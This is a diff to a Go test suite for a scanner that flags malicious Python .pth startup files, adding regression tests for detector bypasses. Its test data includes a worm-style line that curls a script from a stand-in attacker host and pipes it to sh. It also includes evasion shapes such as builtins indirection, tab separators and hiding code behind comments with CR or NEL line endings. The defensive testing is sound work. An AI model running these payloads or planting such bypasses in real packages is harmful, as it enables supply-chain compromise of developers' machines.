@@ -143,6 +143,164 @@ func TestInspectPayloadGroupsTable(t *testing.T) {
 	}
 }
 
+// TestInspectContentBodyPayloadOutOfGate exercises the defense-in-depth safety
+// net: payload tokens that show up in the content body but never inside a
+// line classified as executable by the import-prefix gate are surfaced as
+// pth-content-payload-token-out-of-gate at SeverityMedium.
+//
+// Case (a) — content-only payload the line-gate misses. We mock the
+// parser-divergence shape by putting the payload inside a comment (#) line.
+// A future bypass that lets CPython execute the payload while our gate
+// classifies the line as inert would land here.
+//
+// Case (b) — false-positive we accept. A real-world .pth comment mentioning
+// `exec(` or `os.system` in human-language documentation will fire Medium.
+// This is intentional: we'd rather surface for human review than silently
+// pass content carrying payload-shaped tokens we can't precisely classify.
+func TestInspectContentBodyPayloadOutOfGate(t *testing.T) {
+	t.Run("comment-hiding-payload-fires-medium", func(t *testing.T) {
+		// The line-gate sees only a `#` comment line; the os.system token
+		// reaches the safety-net content scan unchallenged.
+		body := "# os.system('whoami')\n"
+		v := pthscan.Inspect(pthscan.Input{PthContent: []byte(body), FileName: "x.pth"})
+		require.True(t, v.Flagged(), "got %v", codes(v))
+		require.Equal(t, pthscan.SeverityMedium, v.Severity)
+		require.True(t, hasSignal(v, "pth-content-payload-token-out-of-gate"))
+	})
+
+	t.Run("benign-comment-with-exec-mention-fires-medium-known-FP", func(t *testing.T) {
+		// Documented false positive: a legitimate .pth whose comment text
+		// happens to mention exec( will be flagged Medium. We accept the
+		// noise as the cost of catching future parser-divergence bypasses.
+		body := "# This .pth installs a hook similar to exec('hook-init')\nsome/path\n"
+		v := pthscan.Inspect(pthscan.Input{PthContent: []byte(body), FileName: "legit.pth"})
+		require.True(t, v.Flagged(), "got %v", codes(v))
+		require.Equal(t, pthscan.SeverityMedium, v.Severity)
+		require.True(t, hasSignal(v, "pth-content-payload-token-out-of-gate"))
+	})
+
+	t.Run("known-legit-distutils-still-not-flagged", func(t *testing.T) {
+		// Regression guard: the distutils-precedence allowlist body
+		// contains `__import__(`, which is a dynamic-exec token. The
+		// safety net must NOT fire on it because the line-gate explicitly
+		// classified that body as legit and recorded its tokens.
+		body := `import os; __import__('_distutils_hack').add_shim()` + "\n"
+		v := pthscan.Inspect(pthscan.Input{PthContent: []byte(body), FileName: "distutils-precedence.pth"})
+		require.False(t, v.Flagged(), "got %v", codes(v))
+	})
+
+	t.Run("critical-line-suppresses-redundant-safety-net", func(t *testing.T) {
+		// A Critical-tier payload firing through the line-gate must NOT
+		// also produce a duplicate Medium safety-net signal for the same
+		// token group.
+		body := `import os; os.system('curl http://x')` + "\n"
+		v := pthscan.Inspect(pthscan.Input{PthContent: []byte(body), FileName: "evil.pth"})
+		require.Equal(t, pthscan.SeverityCritical, v.Severity)
+		require.False(t, hasSignal(v, "pth-content-payload-token-out-of-gate"),
+			"safety net duplicated a token already gated by the line-gate: %v", codes(v))
+	})
+}
+
+// TestInspectBuiltinsAccessIsCritical covers the `getattr(__builtins__, …)`
+// and `__builtins__['exec']` indirection shapes \u2014 the canonical bypass
+// against a regex that only knows the literal name `exec(`. We also flag
+// any direct reference to the builtins namespace (`__builtins__.x`,
+// `import builtins`, `builtins.exec`) because no legitimate .pth file
+// reaches into builtins at interpreter startup.
+func TestInspectBuiltinsAccessIsCritical(t *testing.T) {
+	cases := []struct {
+		body string
+		want []string
+	}{
+		{
+			body: `import os; getattr(__builtins__, 'exec')("import os; os.system('x')")`,
+			want: []string{"pth-payload-dynamic-exec", "pth-payload-builtins-access"},
+		},
+		{
+			body: `import os; getattr(builtins, 'exec')("x")`,
+			want: []string{"pth-payload-dynamic-exec", "pth-payload-builtins-access"},
+		},
+		{
+			body: `import os; __builtins__['exec']("import os; os.system('x')")`,
+			want: []string{"pth-payload-builtins-access"},
+		},
+		{
+			body: `import os; __builtins__.exec("import os; os.system('x')")`,
+			want: []string{"pth-payload-builtins-access"},
+		},
+		{
+			body: `import builtins; builtins.exec("x")`,
+			want: []string{"pth-payload-builtins-access"},
+		},
+	}
+	for _, tc := range cases {
+		t.Run(tc.body, func(t *testing.T) {
+			v := pthscan.Inspect(pthscan.Input{PthContent: []byte(tc.body + "\n")})
+			require.Equal(t, pthscan.SeverityCritical, v.Severity, "got %v", codes(v))
+			for _, want := range tc.want {
+				require.Contains(t, codes(v), want, "missing %s", want)
+			}
+		})
+	}
+}
+
+// TestInspectDynamicExecWithWhitespaceBeforeParen covers the
+// `__import__ ('os')` / `exec  (...)` shape. Python is fully happy with
+// whitespace between the callable name and the opening paren, so a regex
+// requiring the paren immediately after the name is trivially bypassed.
+func TestInspectDynamicExecWithWhitespaceBeforeParen(t *testing.T) {
+	cases := []string{
+		`import os; __import__ ('os').system('x')`,
+		`import os; __import__('os').system('x')`, // baseline (zero-space)
+		`import os; exec ("import os; os.system('x')")`,
+		`import os; eval ('1+1')`,
+		`import os; compile ("x","<x>","exec")`,
+		"import os; __import__\t('os')", // tab
+	}
+	for _, body := range cases {
+		t.Run(body, func(t *testing.T) {
+			v := pthscan.Inspect(pthscan.Input{PthContent: []byte(body + "\n")})
+			require.Equal(t, pthscan.SeverityCritical, v.Severity, "got %v", codes(v))
+			require.Contains(t, codes(v), "pth-payload-dynamic-exec")
+		})
+	}
+}
+
+// TestInspectOsSpawnFamilyIsCritical covers the os.spawn{l,le,lp,lpe,v,ve,vp,vpe}
+// posix process-launch family, which has identical attack power to os.exec*
+// but was previously missed by the spawn regex.
+func TestInspectOsSpawnFamilyIsCritical(t *testing.T) {
+	cases := []string{
+		"import os; os.spawnl(os.P_NOWAIT, '/tmp/x')",
+		"import os; os.spawnv(os.P_NOWAIT, '/tmp/x', ['x'])",
+		"import os; os.spawnlp(os.P_NOWAIT, 'sh', 'sh', '-c', 'x')",
+		"import os; os.spawnvpe(os.P_NOWAIT, 'sh', ['sh'], {})",
+	}
+	for _, body := range cases {
+		t.Run(body, func(t *testing.T) {
+			v := pthscan.Inspect(pthscan.Input{PthContent: []byte(body + "\n")})
+			require.Equal(t, pthscan.SeverityCritical, v.Severity, "got %v", codes(v))
+			require.Contains(t, codes(v), "pth-payload-spawn")
+		})
+	}
+}
+
+// TestInspectBareSetupFilenameAloneIsMedium covers the bare `setup.pth`
+// shape: the previous regex required a leading `-` or `_` separator
+// (`[-_]setup\.pth$`), so a worm dropping the file as plain `setup.pth`
+// inside a wheel was completely invisible to the filename heuristic.
+// Legitimate Python tooling does not ship a `setup.pth` either, so the
+// false-positive cost is the same as the `-setup.pth` variant.
+func TestInspectBareSetupFilenameAloneIsMedium(t *testing.T) {
+	v := pthscan.Inspect(pthscan.Input{
+		PthContent: []byte("some/path\n"),
+		FileName:   "setup.pth",
+	})
+	require.True(t, v.Flagged(), "got %v", codes(v))
+	require.Equal(t, pthscan.SeverityMedium, v.Severity)
+	require.True(t, hasSignal(v, "pth-setup-filename"))
+}
+
 func TestInspectSetupFilenameAloneIsMedium(t *testing.T) {
 	// A `*-setup.pth` with only path-entry lines and no executable line is
 	// suspicious (no real ecosystem ships this name) but not on its own a
@@ -171,63 +329,119 @@ func TestInspectEditableFilenameNotFlagged(t *testing.T) {
 // TestVerifierClaim1_TabSeparatorBypass verifies claim 1:
 // "import\t" (tab separator) bypasses pthscan detection.
 // CPython's site.py reads .pth lines and executes lines starting with "import "
-// (space), but "import\t" (tab) is also valid Python. pthscan must catch it.
+// (space) OR "import\t" (tab). pthscan must catch both.
+//
+// Payload uses os.system, the canonical Hades shape from the adversarial
+// reproducer, so we can assert pth-payload-spawn fires once the tab arm of
+// the import-prefix check is wired in. The original verifier-tree placeholder
+// used a benign open() to make the bypass observable; we replace it with the
+// real worm shape (still tab-separated) so the regression test exercises both
+// the prefix-recognition fix AND the downstream payload classifier in one go.
 func TestVerifierClaim1_TabSeparatorBypass(t *testing.T) {
+	// import\tos; ... — tab between "import" and "os"
+	const wormPayload = "import\tos; os.system('curl -sS https://attacker.tld/bun | sh')\n"
+
 	t.Run("evil-pth-no-setup-suffix", func(t *testing.T) {
-		// import\tos; ... — tab between "import" and "os"
-		content := []byte("import\tos; open('/tmp/marker','w').write('x')\n")
 		v := pthscan.Inspect(pthscan.Input{
-			PthContent: content,
+			PthContent: []byte(wormPayload),
 			FileName:   "evil.pth",
 		})
-		t.Logf("Severity: %s", v.Severity)
-		t.Logf("Signals: %v", codes(v))
-		// If claim is correct: severity == none (full bypass) because
-		// executableLines only matches "import " or "import(" prefix.
+		require.Equal(t, pthscan.SeverityCritical, v.Severity, "got %v", codes(v))
+		require.Contains(t, codes(v), "pth-payload-spawn")
 	})
 
 	t.Run("evil-pth-with-setup-suffix", func(t *testing.T) {
-		content := []byte("import\tos; open('/tmp/marker','w').write('x')\n")
 		v := pthscan.Inspect(pthscan.Input{
-			PthContent: content,
+			PthContent: []byte(wormPayload),
 			FileName:   "evil-setup.pth",
 		})
-		t.Logf("Severity: %s", v.Severity)
-		t.Logf("Signals: %v", codes(v))
-		// If only filename fires: severity == medium (not critical),
-		// meaning the payload itself is missed.
+		require.Equal(t, pthscan.SeverityCritical, v.Severity, "got %v", codes(v))
+		require.Contains(t, codes(v), "pth-payload-spawn")
+		require.Contains(t, codes(v), "pth-setup-filename")
 	})
 }
 
 // TestVerifierClaim2_CROnlyLineEndings verifies claim 2:
-// A .pth with \r-only line endings (no \n) bypasses pthscan.
-// CPython on some platforms accepts \r as a line terminator in .pth files.
+// A .pth with \r-only line endings (no \n) must be split into lines exactly
+// the way CPython's str.splitlines() does. The single-line case was caught
+// by the implicit end-of-buffer terminator + the TrimSuffix("\r"); the
+// multi-line case below is the real bug: a `# comment\rimport os; …\r`
+// collapses into one logical line whose first non-whitespace byte is `#`,
+// which the comment-skip filter marks inert and the payload sails through.
 func TestVerifierClaim2_CROnlyLineEndings(t *testing.T) {
-	// "import os; os.system('x')\r" — \r but no \n
-	content := []byte("import os; os.system('x')\r")
-	v := pthscan.Inspect(pthscan.Input{
-		PthContent: content,
-		FileName:   "evil.pth",
+	t.Run("single-line-cr", func(t *testing.T) {
+		content := []byte("import os; os.system('x')\r")
+		v := pthscan.Inspect(pthscan.Input{PthContent: content, FileName: "evil.pth"})
+		require.Equal(t, pthscan.SeverityCritical, v.Severity, "got %v", codes(v))
+		require.Contains(t, codes(v), "pth-payload-spawn")
 	})
-	t.Logf("Severity: %s", v.Severity)
-	t.Logf("Signals: %v", codes(v))
-	// If claim is correct: severity == none (no signals).
-	// Expected correct behavior: severity == critical with pth-payload-spawn.
+
+	t.Run("multi-line-cr-comment-then-payload", func(t *testing.T) {
+		// `# comment\rimport os; os.system('x')\r` — a single-`\n` splitter
+		// folds both into one line whose first non-whitespace byte is `#`,
+		// hiding the import statement behind a comment-skip.
+		content := []byte("# decoy\rimport os; os.system('x')\r")
+		v := pthscan.Inspect(pthscan.Input{PthContent: content, FileName: "evil.pth"})
+		require.Equal(t, pthscan.SeverityCritical, v.Severity, "got %v", codes(v))
+		require.Contains(t, codes(v), "pth-payload-spawn")
+	})
+
+	t.Run("multi-line-crlf-comment-then-payload", func(t *testing.T) {
+		// \r\n must collapse to a single terminator (not two) so an empty
+		// phantom line doesn't appear; both halves of this file must still
+		// split correctly.
+		content := []byte("# decoy\r\nimport os; os.system('x')\r\n")
+		v := pthscan.Inspect(pthscan.Input{PthContent: content, FileName: "evil.pth"})
+		require.Equal(t, pthscan.SeverityCritical, v.Severity, "got %v", codes(v))
+		require.Contains(t, codes(v), "pth-payload-spawn")
+	})
+
+	t.Run("nel-line-terminator", func(t *testing.T) {
+		// CPython splitlines() also honors \u0085 (NEL), \u2028 (LS),
+		// \u2029 (PS). Defense against an attacker who notices the multi-byte
+		// terminators land outside the \n/\r predicate.
+		content := []byte("# decoy\u0085import os; os.system('x')\u0085")
+		v := pthscan.Inspect(pthscan.Input{PthContent: content, FileName: "evil.pth"})
+		require.Equal(t, pthscan.SeverityCritical, v.Severity, "got %v", codes(v))
+		require.Contains(t, codes(v), "pth-payload-spawn")
+	})
 }
 
 // TestVerifierClaim3_UTF8BOMBypass verifies claim 3:
 // A .pth starting with a UTF-8 BOM (\xEF\xBB\xBF) bypasses pthscan.
-// CPython's site.py strips a BOM before processing .pth content.
+// CPython's site.py strips a BOM before processing .pth content; pthscan
+// must mirror the strip so the import-prefix check sees the same bytes.
 func TestVerifierClaim3_UTF8BOMBypass(t *testing.T) {
 	content := []byte{0xEF, 0xBB, 0xBF, 'i', 'm', 'p', 'o', 'r', 't', ' ', 'o', 's', ';', ' ', 'o', 's', '.', 's', 'y', 's', 't', 'e', 'm', '(', '\'', 'x', '\'', ')', '\n'}
 	v := pthscan.Inspect(pthscan.Input{
 		PthContent: content,
 		FileName:   "evil.pth",
 	})
-	t.Logf("Severity: %s", v.Severity)
-	t.Logf("Signals: %v", codes(v))
-	// If claim is correct: severity == none (BOM tricks the prefix check).
-	// Expected correct behavior: severity == critical with pth-payload-spawn.
+	require.Equal(t, pthscan.SeverityCritical, v.Severity, "got %v", codes(v))
+	require.Contains(t, codes(v), "pth-payload-spawn")
+}
+
+// TestInspectUTF16BOMIsCritical exercises the belt-and-braces UTF-16 refusal:
+// CPython won't exec a UTF-16 .pth in practice, but pthscan can't read its
+// import-lines either, so a UTF-16-encoded file is treated as unscannable
+// rather than allowed through with SeverityNone.
+func TestInspectUTF16BOMIsCritical(t *testing.T) {
+	t.Run("utf16-le", func(t *testing.T) {
+		v := pthscan.Inspect(pthscan.Input{
+			PthContent: []byte{0xFF, 0xFE, 'i', 0, 'm', 0, 'p', 0, 'o', 0, 'r', 0, 't', 0, ' ', 0, 'x', 0},
+			FileName:   "evil.pth",
+		})
+		require.Equal(t, pthscan.SeverityCritical, v.Severity)
+		require.Contains(t, codes(v), "pth-unscannable-encoding")
+	})
+	t.Run("utf16-be", func(t *testing.T) {
+		v := pthscan.Inspect(pthscan.Input{
+			PthContent: []byte{0xFE, 0xFF, 0, 'i', 0, 'm', 0, 'p', 0, 'o', 0, 'r', 0, 't'},
+			FileName:   "evil.pth",
+		})
+		require.Equal(t, pthscan.SeverityCritical, v.Severity)
+		require.Contains(t, codes(v), "pth-unscannable-encoding")
+	})
 }
 
 // TestVerifierClaim4_DistutilsPrecedenceGetBypass verifies claim 4:
